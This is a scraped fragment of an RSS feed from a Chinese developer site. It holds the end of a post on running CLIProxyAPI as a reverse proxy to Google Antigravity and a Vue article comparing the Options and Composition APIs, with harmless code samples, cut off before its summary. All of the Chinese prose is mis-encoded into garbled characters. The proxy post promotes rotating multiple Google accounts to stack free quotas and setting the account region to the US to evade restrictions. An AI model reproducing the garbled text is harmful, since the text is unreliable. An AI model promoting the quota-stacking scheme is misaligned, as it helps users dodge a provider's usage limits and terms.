<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4697a7c3443f4b45a64cf47766d3bb30~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd3d3emhvdWh1aQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767954119&amp;x-signature=761De%2FNu2edXgRHlF4UMi0yiahk%3D" alt="image-20260102173454535" loading="lazy"/></p>
<p>è¿™æ ·æˆ‘ä»¬åœ¨cliå‘½ä»¤ä¸­ä¹Ÿå¯ä»¥ä½¿ç”¨google  Antigravity æ¥å®ç°å›½å¤–é¡¶çº§æ¨¡å‹å…è´¹ä½¿ç”¨äº†ã€‚</p>
<h2 data-id="heading-14">4.æ€»ç»“</h2>
<p>ä»Šå¤©ä¸»è¦å¸¦å¤§å®¶äº†è§£å¹¶å®ç°äº†CLIProxyAPIé…åˆGoogle Antigravityçš„åä»£éƒ¨ç½²å®Œæ•´æµç¨‹ï¼Œè¯¥æ–¹æ¡ˆä»¥"Dockerå®¹å™¨åŒ–éƒ¨ç½² + OAuthæˆæƒè®¤è¯"ä¸ºæ ¸å¿ƒä¼˜åŠ¿ï¼Œç»“åˆå¼€å‘è€…å¯¹é¡¶çº§å¤§æ¨¡å‹å…è´¹ä½¿ç”¨çš„å¼ºçƒˆéœ€æ±‚ï¼Œé€šè¿‡CLIProxyAPIåç«¯æœåŠ¡ä¸EasyCLIå®¢æˆ·ç«¯å·¥å…·ï¼Œå½¢æˆäº†ä¸€å¥—ä»Googleè´¦å·æˆæƒåˆ°æ ‡å‡†APIè°ƒç”¨çš„å…¨é“¾è·¯ç™½å«–æ–¹æ¡ˆã€‚</p>
<p>åœ¨å®é™…åº”ç”¨ä¸­ï¼Œè¯¥æ–¹æ¡ˆä¸ä»…æ”¯æŒå¤šGoogleè´¦å·è½®æ¢ä½¿ç”¨å®ç°é¢åº¦å åŠ ï¼Œè¿˜æ”¯æŒè¿œç¨‹éƒ¨ç½²ä¾›å›¢é˜Ÿå…±äº«ä½¿ç”¨ï¼Œé€‚é…æ€§è¿œä¼˜äºå•ä¸€å®˜æ–¹è®¢é˜…æ–¹æ¡ˆï¼›ç‰¹åˆ«æ˜¯é€šè¿‡æ ‡å‡†OpenAIåè®®è½¬æ¢ï¼Œæœ‰æ•ˆè§£å†³äº†ä¸åŒå¹³å°APIåè®®ä¸å…¼å®¹çš„éš¾é¢˜ã€‚åŒæ—¶ï¼Œæ–¹æ¡ˆå…·å¤‡è‰¯å¥½çš„æ‰©å±•æ€§â€”â€”å°ä¼™ä¼´ä»¬å¯ä»¥åŸºäºæ­¤æ‰©å±•æ›´å¤šåº”ç”¨åœºæ™¯ï¼Œå¦‚æ¥å…¥Cursorç¼–è¾‘å™¨ã€é…ç½®åˆ°å„ç±»AI Agentæ¡†æ¶ã€æ­å»ºç§æœ‰åŒ–AIåŠ©æ‰‹ç­‰ï¼Œè¿›ä¸€æ­¥å‘æŒ¥å…è´¹é¡¶çº§æ¨¡å‹åœ¨ä»£ç å¼€å‘ã€å†…å®¹åˆ›ä½œã€å›¾åƒç”Ÿæˆç­‰é¢†åŸŸçš„åº”ç”¨ä»·å€¼ã€‚éœ€è¦æ³¨æ„çš„æ˜¯Googleè´¦å·åœ°åŒºéœ€è®¾ç½®ä¸ºç¾å›½ç­‰éå—é™åœ°åŒºï¼Œå…è´¹è´¦å·é¢åº¦ä¸€å‘¨é‡ç½®è€ŒProè´¦å·æ¯å¤©é‡ç½®ã€‚</p>
<p>æ„Ÿå…´è¶£çš„å°ä¼™ä¼´å¯ä»¥æŒ‰ç…§æ–‡ä¸­æä¾›çš„æ­¥éª¤è¿›è¡Œå®è·µï¼Œæ ¹æ®å®é™…ä½¿ç”¨éœ€æ±‚è°ƒæ•´è´¦å·æ•°é‡å’Œéƒ¨ç½²æ–¹å¼ã€‚ä»Šå¤©çš„åˆ†äº«å°±åˆ°è¿™é‡Œç»“æŸäº†ï¼Œæˆ‘ä»¬ä¸‹ä¸€ç¯‡æ–‡ç« è§ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[é¢è¯•å®˜ : â€œ Vue é€‰é¡¹å¼api å’Œ ç»„åˆå¼api ä»€ä¹ˆåŒºåˆ«? â€œ]]></title>    <link>https://juejin.cn/post/7590104561475715124</link>    <guid>https://juejin.cn/post/7590104561475715124</guid>    <pubDate>2026-01-02T10:12:32.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7590104561475715124" data-draft-id="7590159073988395060" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="é¢è¯•å®˜ : â€œ Vue é€‰é¡¹å¼api å’Œ ç»„åˆå¼api ä»€ä¹ˆåŒºåˆ«? â€œ"/> <meta itemprop="keywords" content="å‰ç«¯,Vue.js,é¢è¯•"/> <meta itemprop="datePublished" content="2026-01-02T10:12:32.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="åƒå¯»girling"/> <meta itemprop="url" content="https://juejin.cn/user/2276467567770442"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            é¢è¯•å®˜ : â€œ Vue é€‰é¡¹å¼api å’Œ ç»„åˆå¼api ä»€ä¹ˆåŒºåˆ«? â€œ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2276467567770442/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    åƒå¯»girling
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T10:12:32.000Z" title="Fri Jan 02 2026 10:12:32 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>Vue çš„<strong>é€‰é¡¹å¼ API (Options API)</strong> Â å’Œ<strong>ç»„åˆå¼ API (Composition API)</strong> Â æ˜¯ä¸¤ç§æ ¸å¿ƒçš„ä»£ç ç»„ç»‡æ–¹å¼ï¼Œå‰è€…ä¾§é‡ â€œæŒ‰é€‰é¡¹åˆ†ç±»â€ï¼Œåè€…ä¾§é‡ â€œæŒ‰é€»è¾‘åˆ†ç±»â€ï¼Œæ ¸å¿ƒå·®å¼‚ä½“ç°åœ¨è®¾è®¡ç†å¿µã€ä»£ç ç»“æ„ã€å¤ç”¨æ€§ç­‰ç»´åº¦ï¼Œä»¥ä¸‹æ˜¯å…¨é¢å¯¹æ¯”å’Œå®ç”¨è§£è¯»ï¼š</p>
<h3 data-id="heading-0">ä¸€ã€æ ¸å¿ƒåŒºåˆ«å¯¹æ¯”è¡¨</h3>























































<table><thead><tr><th>ç»´åº¦</th><th>é€‰é¡¹å¼ API (Options API)</th><th>ç»„åˆå¼ API (Composition API)</th></tr></thead><tbody><tr><td><strong>è®¾è®¡ç†å¿µ</strong></td><td>æŒ‰ â€œé€‰é¡¹ç±»å‹â€ ç»„ç»‡ä»£ç ï¼ˆdataã€methodsã€computed ç­‰ï¼‰</td><td>æŒ‰ â€œä¸šåŠ¡é€»è¾‘â€ ç»„ç»‡ä»£ç ï¼ˆåŒä¸€é€»è¾‘çš„ä»£ç èšåˆï¼‰</td></tr><tr><td><strong>ä»£ç ç»“æ„</strong></td><td>åˆ†æ•£å¼ï¼šåŒä¸€é€»è¾‘çš„ä»£ç åˆ†æ•£åœ¨ä¸åŒé€‰é¡¹ä¸­</td><td>èšåˆå¼ï¼šåŒä¸€é€»è¾‘çš„ä»£ç é›†ä¸­åœ¨ setup æˆ–Â <code>&lt;script setup&gt;</code></td></tr><tr><td><strong>é€‚ç”¨åœºæ™¯</strong></td><td>å°å‹ç»„ä»¶ã€ç®€å•ä¸šåŠ¡ï¼ˆå¿«é€Ÿä¸Šæ‰‹ï¼‰</td><td>ä¸­å¤§å‹ç»„ä»¶ã€å¤æ‚ä¸šåŠ¡ï¼ˆé€»è¾‘å¤ç”¨ / ç»´æŠ¤ï¼‰</td></tr><tr><td><strong>é€»è¾‘å¤ç”¨</strong></td><td>ä¾èµ– mixinï¼ˆæ˜“å‘½åå†²çªã€æ¥æºä¸æ¸…æ™°ï¼‰</td><td>ä¾èµ–ç»„åˆå¼å‡½æ•°ï¼ˆComposablesï¼Œçº¯å‡½æ•°å¤ç”¨ï¼Œæ¸…æ™°å¯æ§ï¼‰</td></tr><tr><td><strong>ç±»å‹æ¨å¯¼</strong></td><td>å¯¹ TypeScript æ”¯æŒå¼±ï¼ˆéœ€æ‰‹åŠ¨æ ‡æ³¨ï¼‰</td><td>å¤©ç„¶é€‚é… TSï¼Œç±»å‹æ¨å¯¼æ›´å®Œå–„</td></tr><tr><td><strong>å“åº”å¼å†™æ³•</strong></td><td>å£°æ˜å¼ï¼šdata è¿”å›å¯¹è±¡ï¼ŒVue è‡ªåŠ¨å“åº”å¼</td><td>æ‰‹åŠ¨å¼ï¼šç”¨ ref/reactive åˆ›å»ºå“åº”å¼æ•°æ®</td></tr><tr><td><strong>ç”Ÿå‘½å‘¨æœŸ</strong></td><td>ç›´æ¥å£°æ˜é’©å­ï¼ˆcreatedã€mounted ç­‰ï¼‰</td><td>setup ä¸­é€šè¿‡Â <code>onMounted</code>Â ç­‰å‡½æ•°è°ƒç”¨ï¼ˆæ—  beforeCreate/createdï¼‰</td></tr><tr><td><strong>ä»£ç å¯è¯»æ€§</strong></td><td>ç®€å•åœºæ™¯æ¸…æ™°ï¼Œå¤æ‚åœºæ™¯ â€œç¢ç‰‡åŒ–â€</td><td>å¤æ‚åœºæ™¯é€»è¾‘èšåˆï¼Œå¯è¯»æ€§æ›´é«˜</td></tr><tr><td><strong>ä¸Šæ‰‹æˆæœ¬</strong></td><td>ä½ï¼ˆç¬¦åˆä¼ ç»Ÿå‰ç«¯æ€ç»´ï¼‰</td><td>ç¨é«˜ï¼ˆéœ€ç†è§£ ref/reactive/setup ç­‰æ¦‚å¿µï¼‰</td></tr></tbody></table>
<h3 data-id="heading-1">äºŒã€ä»£ç ç¤ºä¾‹ç›´è§‚å¯¹æ¯”</h3>
<h4 data-id="heading-2">1. é€‰é¡¹å¼ APIï¼ˆVue 2/3 å…¼å®¹ï¼‰</h4>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>{{ count }} <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">"add"</span>&gt;</span>+1<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
  <span class="hljs-comment">// æ•°æ®ï¼ˆå“åº”å¼ï¼‰</span>
  <span class="hljs-title function_">data</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> {
      <span class="hljs-attr">count</span>: <span class="hljs-number">0</span>
    };
  },
  <span class="hljs-comment">// æ–¹æ³•</span>
  <span class="hljs-attr">methods</span>: {
    <span class="hljs-title function_">add</span>(<span class="hljs-params"/>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">count</span>++;
    }
  },
  <span class="hljs-comment">// ç”Ÿå‘½å‘¨æœŸ</span>
  <span class="hljs-title function_">mounted</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'ç»„ä»¶æŒ‚è½½ï¼š'</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">count</span>);
  }
};
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p>ç‰¹ç‚¹ï¼šä»£ç æŒ‰Â <code>data</code>/<code>methods</code>/<code>mounted</code>Â ç­‰é€‰é¡¹æ‹†åˆ†ï¼ŒåŒä¸€ â€œè®¡æ•°é€»è¾‘â€ åˆ†æ•£åœ¨ä¸åŒåŒºå—ã€‚</p>
<h4 data-id="heading-3">2. ç»„åˆå¼ APIï¼ˆVue 3 æ¨èï¼Œ<code>&lt;script setup&gt;</code>Â è¯­æ³•ç³–ï¼‰</h4>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>{{ count }} <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">"add"</span>&gt;</span>+1<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { ref, onMounted } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>;

<span class="hljs-comment">// å“åº”å¼æ•°æ®ï¼ˆref ç”¨äºåŸºæœ¬ç±»å‹ï¼‰</span>
<span class="hljs-keyword">const</span> count = <span class="hljs-title function_">ref</span>(<span class="hljs-number">0</span>);

<span class="hljs-comment">// æ–¹æ³•ï¼ˆä¸æ•°æ®èšåˆï¼‰</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">add</span> = (<span class="hljs-params"/>) =&gt; {
  count.<span class="hljs-property">value</span>++; <span class="hljs-comment">// ref éœ€é€šè¿‡ .value è®¿é—®</span>
};

<span class="hljs-comment">// ç”Ÿå‘½å‘¨æœŸ</span>
<span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'ç»„ä»¶æŒ‚è½½ï¼š'</span>, count.<span class="hljs-property">value</span>);
});
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p>ç‰¹ç‚¹ï¼šâ€œè®¡æ•°é€»è¾‘â€ çš„<strong>æ•°æ®ã€æ–¹æ³•ã€ç”Ÿå‘½å‘¨æœŸ</strong>å…¨éƒ¨èšåˆåœ¨ä¸€å¤„ï¼Œé€»è¾‘è¾¹ç•Œæ¸…æ™°ã€‚</p>
<h3 data-id="heading-4">ä¸‰ã€æ ¸å¿ƒå·®å¼‚æ·±åº¦è§£è¯»</h3>
<h4 data-id="heading-5">1. é€»è¾‘å¤ç”¨ï¼šä» mixin åˆ° Composablesï¼ˆç»„åˆå¼å‡½æ•°ï¼‰</h4>
<ul>
<li>
<p><strong>é€‰é¡¹å¼ API çš„ç—›ç‚¹ï¼ˆmixinï¼‰</strong> ï¼šå¤ç”¨é€»è¾‘éœ€å†™ mixin æ–‡ä»¶ï¼Œå¤šä¸ª mixin æ˜“å‡ºç°å‘½åå†²çªï¼Œä¸”æ— æ³•æ¸…æ™°çŸ¥é“å±æ€§æ¥æºï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// mixin/countMixin.js</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
  <span class="hljs-title function_">data</span>(<span class="hljs-params"/>) { <span class="hljs-keyword">return</span> { <span class="hljs-attr">count</span>: <span class="hljs-number">0</span> }; },
  <span class="hljs-attr">methods</span>: { <span class="hljs-title function_">add</span>(<span class="hljs-params"/>) { <span class="hljs-variable language_">this</span>.<span class="hljs-property">count</span>++; } }
};
<span class="hljs-comment">// ç»„ä»¶ä¸­ä½¿ç”¨</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
  <span class="hljs-attr">mixins</span>: [countMixin], <span class="hljs-comment">// å¼•å…¥åï¼Œcount/add æ··å…¥ç»„ä»¶ï¼Œä½†æ¥æºä¸ç›´è§‚</span>
};
</code></pre>
</li>
<li>
<p><strong>ç»„åˆå¼ API çš„ä¼˜åŠ¿ï¼ˆComposablesï¼‰</strong> ï¼šå¤ç”¨é€»è¾‘å°è£…ä¸ºçº¯å‡½æ•°ï¼ŒæŒ‰éœ€å¯¼å…¥ï¼Œå±æ€§æ¥æºæ¸…æ™°ï¼Œæ— å‘½åå†²çªï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// composables/useCount.js</span>
<span class="hljs-keyword">import</span> { ref } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>;
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title function_">useCount</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">const</span> count = <span class="hljs-title function_">ref</span>(<span class="hljs-number">0</span>);
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">add</span> = (<span class="hljs-params"/>) =&gt; count.<span class="hljs-property">value</span>++;
  <span class="hljs-keyword">return</span> { count, add };
};
<span class="hljs-comment">// ç»„ä»¶ä¸­ä½¿ç”¨</span>
<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { useCount } <span class="hljs-keyword">from</span> <span class="hljs-string">'./composables/useCount'</span>;
<span class="hljs-keyword">const</span> { count, add } = <span class="hljs-title function_">useCount</span>(); <span class="hljs-comment">// æ˜ç¡®å¯¼å…¥ï¼Œæ¥æºæ¸…æ™°</span>
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span>
</code></pre>
</li>
</ul>
<h4 data-id="heading-6">2. å“åº”å¼åŸç†ï¼šå£°æ˜å¼ vs æ‰‹åŠ¨å¼</h4>
<ul>
<li>é€‰é¡¹å¼ APIï¼š<code>data</code>Â è¿”å›çš„å¯¹è±¡ä¼šè¢« Vue é€’å½’åŠ«æŒï¼ˆObject.defineProperty/Proxyï¼‰ï¼Œè‡ªåŠ¨å˜æˆå“åº”å¼ï¼Œç›´æ¥é€šè¿‡Â <code>this.xxx</code>Â è®¿é—®ï¼›</li>
<li>ç»„åˆå¼ APIï¼šéœ€æ‰‹åŠ¨ç”¨Â <code>ref</code>ï¼ˆåŸºæœ¬ç±»å‹ï¼‰/<code>reactive</code>ï¼ˆå¼•ç”¨ç±»å‹ï¼‰åˆ›å»ºå“åº”å¼æ•°æ®ï¼Œ<code>ref</code>Â éœ€é€šè¿‡Â <code>.value</code>Â è®¿é—®ï¼ˆæ¨¡æ¿ä¸­è‡ªåŠ¨è§£åŒ…ï¼‰ï¼Œæ›´çµæ´»ä¸”å¯æ§ã€‚</li>
</ul>
<h4 data-id="heading-7">3. å¤§å‹é¡¹ç›®é€‚é…æ€§</h4>
<ul>
<li>é€‰é¡¹å¼ APIï¼šç»„ä»¶å¤æ‚åº¦æå‡åï¼ŒåŒä¸€ä¸šåŠ¡é€»è¾‘çš„ä»£ç ä¼šåˆ†æ•£åœ¨Â <code>data</code>/<code>methods</code>/<code>computed</code>/<code>watch</code>Â ç­‰å¤šä¸ªé€‰é¡¹ä¸­ï¼Œå½¢æˆ â€œé¢æ¡ä»£ç â€ï¼Œç»´æŠ¤æˆæœ¬é«˜ï¼›</li>
<li>ç»„åˆå¼ APIï¼šå¯å°†å¤æ‚ä¸šåŠ¡æ‹†åˆ†ä¸ºå¤šä¸ª Composablesï¼ˆå¦‚Â <code>useUser</code>/<code>useCart</code>/<code>useOrder</code>ï¼‰ï¼Œæ¯ä¸ªå‡½æ•°è´Ÿè´£ä¸€ä¸ªé€»è¾‘æ¨¡å—ï¼Œä»£ç ç»“æ„æ¸…æ™°ï¼Œä¾¿äºå¤šäººåä½œå’Œç»´æŠ¤ã€‚</li>
</ul>
<h3 data-id="heading-8">å››ã€é€‰å‹å»ºè®®</h3>

























<table><thead><tr><th>åœºæ™¯</th><th>æ¨è API</th></tr></thead><tbody><tr><td>å°å‹ç»„ä»¶ / å¿«é€ŸåŸå‹</td><td>é€‰é¡¹å¼ API</td></tr><tr><td>ä¸­å¤§å‹é¡¹ç›® / å¤æ‚é€»è¾‘</td><td>ç»„åˆå¼ API</td></tr><tr><td>éœ€å…¼å®¹ Vue 2 + Vue 3</td><td>é€‰é¡¹å¼ APIï¼ˆè¿‡æ¸¡ï¼‰</td></tr><tr><td>ç”¨ TypeScript å¼€å‘</td><td>ç»„åˆå¼ API</td></tr></tbody></table>
<h3 data-id="heading-9">æ€»ç»“</h3>
<ul>
